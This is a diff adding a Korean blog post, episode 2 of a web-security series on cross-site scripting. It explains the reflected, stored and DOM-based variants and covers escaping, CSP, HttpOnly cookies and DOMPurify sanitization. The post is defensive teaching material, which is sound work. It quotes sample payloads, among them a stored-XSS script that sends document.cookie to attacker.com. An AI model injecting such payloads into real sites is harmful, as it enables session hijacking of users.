@@ -1,0 +1,203 @@
+---
+title: "XSS: 브라우저에서 남의 스크립트가 실행되는 사고"
+subtitle: "Reflected, Stored, DOM 세 종류와 CSP, HTTP-only 쿠키, 이스케이프·sanitize까지."
+dateText: "2026.05.13"
+episode: 2
+episodes: 3
+---
+
+<h2>XSS가 뭔가</h2>
+
+<p>
+  Cross-Site Scripting. 공격자의 스크립트가 다른 사용자의 브라우저에서 실행되는 사고예요. 브라우저는 그 사이트의 컨텍스트에서 스크립트를 실행하니까, 그 사이트의 쿠키·토큰·세션이 다 노출돼요.
+</p>
+
+<p>
+  최악의 시나리오는 "공격자가 피해자의 세션 쿠키를 훔쳐 그 사용자로 로그인". 또는 피해자 권한으로 임의 동작 수행, 또는 키로깅. 사용자 한 명을 인질로 잡는 수준의 공격이에요.
+</p>
+
+<h2>세 가지 종류</h2>
+
+<table>
+  <thead>
+    <tr><th>종류</th><th>원리</th><th>예시</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Reflected</td><td>URL 파라미터가 응답에 반영</td><td>검색 결과 페이지에 검색어 그대로 노출</td></tr>
+    <tr><td>Stored</td><td>DB에 저장된 악성 입력이 다른 사용자에게 표시</td><td>댓글, 게시글, 프로필</td></tr>
+    <tr><td>DOM</td><td>클라이언트 JS가 입력을 DOM에 끼워 넣음</td><td>SPA, 해시 라우터</td></tr>
+  </tbody>
+</table>
+
+<h3>Reflected XSS</h3>
+
+<p>
+  공격자가 악성 스크립트가 포함된 URL을 피해자에게 전달해요. 피해자가 클릭하면 그 URL의 파라미터가 페이지에 그대로 출력되면서 스크립트가 실행돼요.
+</p>
+
+<pre><code class="language-html">// 위험한 코드
+&lt;p&gt;검색어: ${searchQuery}&lt;/p&gt;
+
+// 공격자가 보낸 URL
+http://example.com/search?q=&lt;script&gt;steal()&lt;/script&gt;
+
+// 렌더링 결과
+&lt;p&gt;검색어: &lt;script&gt;steal()&lt;/script&gt;&lt;/p&gt;</code></pre>
+
+<h3>Stored XSS</h3>
+
+<p>
+  악성 스크립트가 서버에 저장되고, 다른 사용자가 그 페이지를 방문할 때마다 실행돼요. Reflected보다 위험해요. URL 클릭 한 번 안 해도 피해를 입을 수 있고, 한 게시글이 수천 명에게 노출돼요.
+</p>
+
+<pre><code class="language-html">// 댓글에 저장된 악성 입력
+&lt;script&gt;fetch('http://attacker.com?cookie=' + document.cookie)&lt;/script&gt;
+
+// 다른 사용자가 글을 보면 자기 쿠키가 attacker.com으로 전송</code></pre>
+
+<h3>DOM-based XSS</h3>
+
+<p>
+  서버 응답은 깨끗한데, 클라이언트 JavaScript가 사용자 입력을 받아 DOM에 직접 끼워 넣을 때 발생해요. URL hash, query string, localStorage 같은 입력을 <code>innerHTML</code>로 넣으면 발생해요.
+</p>
+
+<pre><code class="language-javascript">// 위험한 클라이언트 코드
+const name = new URLSearchParams(location.search).get('name');
+document.getElementById('greeting').innerHTML = `안녕, ${name}`;
+
+// URL: ?name=&lt;img src=x onerror=alert(1)&gt;
+// → onerror 실행</code></pre>
+
+<h2>핵심 방어: 출력 시 escape</h2>
+
+<p>
+  XSS 방어의 1순위는 <strong>HTML 출력 시 escape</strong>예요. 사용자 입력을 HTML로 렌더링할 때 특수 문자(<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>, <code>'</code>)를 HTML 엔티티로 변환해요.
+</p>
+
+<table>
+  <thead>
+    <tr><th>원문</th><th>이스케이프</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>&lt;</td><td>&amp;lt;</td></tr>
+    <tr><td>&gt;</td><td>&amp;gt;</td></tr>
+    <tr><td>&amp;</td><td>&amp;amp;</td></tr>
+    <tr><td>"</td><td>&amp;quot;</td></tr>
+    <tr><td>'</td><td>&amp;#x27;</td></tr>
+  </tbody>
+</table>
+
+<p>
+  이렇게 하면 <code>&lt;script&gt;</code>가 텍스트로만 보이고 실행되지 않아요. 대부분의 템플릿 엔진(Thymeleaf, Vue, React, Django)은 기본으로 escape를 해줘요. 우리가 의식적으로 escape를 끄지 않는 한 안전해요.
+</p>
+
+<h2>위험한 자리들</h2>
+
+<p>
+  다음 자리에서는 escape가 자동으로 안 되거나, 다른 종류의 escape가 필요해요.
+</p>
+
+<h3>1. innerHTML / v-html / dangerouslySetInnerHTML</h3>
+
+<p>
+  이 API들은 escape를 하지 않아요. 사용자 입력을 절대 직접 넣으면 안 돼요. 대신 <code>textContent</code>나 <code>{value}</code> JSX 표현식을 써요. 부득이 HTML을 넣어야 하면 DOMPurify 같은 sanitizer로 정제.
+</p>
+
+<h3>2. URL 속성에 입력 넣기</h3>
+
+<pre><code class="language-html">// 위험
+&lt;a href="${userInput}"&gt;링크&lt;/a&gt;
+
+// 공격: userInput = "javascript:alert(1)"
+// 클릭하면 alert 실행</code></pre>
+
+<p>
+  방어는 프로토콜 화이트리스트예요. <code>http://</code>, <code>https://</code>, <code>mailto:</code>만 허용하고 <code>javascript:</code>, <code>data:</code>는 차단해요.
+</p>
+
+<h3>3. JavaScript 컨텍스트에 입력</h3>
+
+<pre><code class="language-html">&lt;script&gt;
+  const name = "${userInput}";   // 위험
+&lt;/script&gt;</code></pre>
+
+<p>
+  HTML escape로는 부족해요. JavaScript 문자열 컨텍스트는 따로 escape가 필요해요. <code><</code> 같은 유니코드 형태로. 또는 데이터를 JSON으로 만들어 별도로 처리해요. 또는 <code>data-*</code> 속성으로 전달해요.
+</p>
+
+<h3>4. CSS 컨텍스트에 입력</h3>
+
+<p>
+  거의 안 만나지만 가능해요. CSS도 escape 규칙이 따로 있어요. 사용자 입력을 CSS에 직접 넣지 마세요.
+</p>
+
+<h2>Content Security Policy (CSP)</h2>
+
+<p>
+  XSS가 발생해도 영향을 제한하는 헤더 기반 방어예요. 어떤 스크립트를 어디서 로드할지를 서버가 응답 헤더로 선언.
+</p>
+
+<pre><code class="language-bash">// 응답 헤더
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://cdn.example.com;
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;</code></pre>
+
+<p>
+  <code>script-src 'self'</code>면 같은 도메인의 스크립트만 실행돼요. 인라인 스크립트(<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)는 차단돼요. 공격자가 stored XSS로 인라인 스크립트를 심어도 브라우저가 실행을 거부해요.
+</p>
+
+<p>
+  주의: <code>'unsafe-inline'</code>을 켜면 CSP의 의미가 거의 사라져요. 인라인 스크립트가 다 허용되니까. 의도적으로 두지 마세요. 인라인이 필요하면 nonce나 hash를 써요.
+</p>
+
+<h2>HTTP-only 쿠키: 토큰 탈취 방어</h2>
+
+<p>
+  XSS가 노리는 주요 목표는 세션 쿠키 탈취예요. <code>document.cookie</code>로 읽어다가 외부로 보내요.
+</p>
+
+<p>
+  세션 쿠키에 <strong><code>HttpOnly</code></strong> 플래그를 켜면 JavaScript가 그 쿠키를 못 읽어요. 브라우저는 요청에 자동으로 첨부하지만, JS 코드에서는 안 보여요. XSS가 발생해도 세션 탈취는 막혀요.
+</p>
+
+<pre><code class="language-bash">// 응답에서 쿠키 설정
+Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>
+
+<p>
+  세션 쿠키는 항상 <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code>로 설정해요. 비용 거의 없고 효과는 큼.
+</p>
+
+<h2>Sanitization: 사용자 HTML 허용해야 할 때</h2>
+
+<p>
+  블로그 댓글에서 일부 HTML 태그(<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;a&gt;</code>)를 허용하고 싶을 때가 있어요. 그땐 escape 대신 <strong>sanitize</strong>가 필요해요. 허용 태그·속성만 통과시키고 위험한 건 제거.
+</p>
+
+<pre><code class="language-javascript">// DOMPurify 사용
+import DOMPurify from 'dompurify';
+
+const dirty = userInput;   // &lt;script&gt;alert(1)&lt;/script&gt;&lt;b&gt;hi&lt;/b&gt;
+const clean = DOMPurify.sanitize(dirty);
+// 결과: &lt;b&gt;hi&lt;/b&gt;</code></pre>
+
+<p>
+  직접 정규식으로 sanitize 안 해요. 우회 패턴이 너무 많아요. 반드시 검증된 라이브러리(DOMPurify, OWASP Java HTML Sanitizer 등)를 써요.
+</p>
+
+<h2>한 줄 정리</h2>
+
+<ul>
+  <li>출력 시 HTML escape가 1순위. 템플릿 엔진의 기본 동작 유지.</li>
+  <li><code>innerHTML</code>, <code>v-html</code>, <code>dangerouslySetInnerHTML</code> 피하기.</li>
+  <li>세션 쿠키는 <code>HttpOnly</code> + <code>Secure</code> + <code>SameSite</code>.</li>
+  <li>CSP로 다층 방어.</li>
+  <li>HTML 허용해야 하면 직접 만들지 말고 DOMPurify 같은 sanitizer.</li>
+</ul>
+
+<h2>다음 편</h2>
+
+<p>
+  마지막 편에서는 CSRF(Cross-Site Request Forgery)를 봐요. XSS와 자주 헷갈리는 공격이에요. SameSite 쿠키, CSRF 토큰, double submit cookie 패턴을 정리해요.
+</p>
